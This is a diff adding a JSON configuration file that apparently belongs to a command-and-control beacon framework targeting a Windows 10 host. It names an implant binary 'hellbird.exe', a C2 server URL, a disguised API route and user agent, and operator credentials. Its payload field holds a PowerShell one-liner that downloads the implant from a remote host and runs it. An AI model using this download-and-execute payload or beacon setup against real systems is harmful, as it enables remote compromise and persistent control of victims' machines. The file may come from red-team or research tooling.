@@ -1,0 +1,19 @@
+{
+  "id": "1m4nnkkpvhYH",
+  "name": "win10-pro",
+  "binary": "/home/grisun0/src_note/c/beacon/hellbird.exe",
+  "url_binary": "http://192.168.1.10/hellbird.exe",
+  "os_id": "1",
+  "os": "windows",
+  "rhost": "",
+  "log": "win10-pro.log",
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+  "maleable_route": "/api/v2/submit",
+  "url": "https://c2.ejemplo.com:8443",
+  "sleep": "6",
+  "username": "AdminC2",
+  "password": "P@ssw0rd_Secret_2025",
+  "working_path": "/home/grisun0/src_note/c/beacon",
+  "payload": "powershell -c 'Invoke-WebRequest 'http://192.168.1.10/hellbird.exe' -OutFile 'hellbird.exe'; Start-Process 'hellbird.exe''",
+  "created": "2026-11-22 02:29:02"
+}
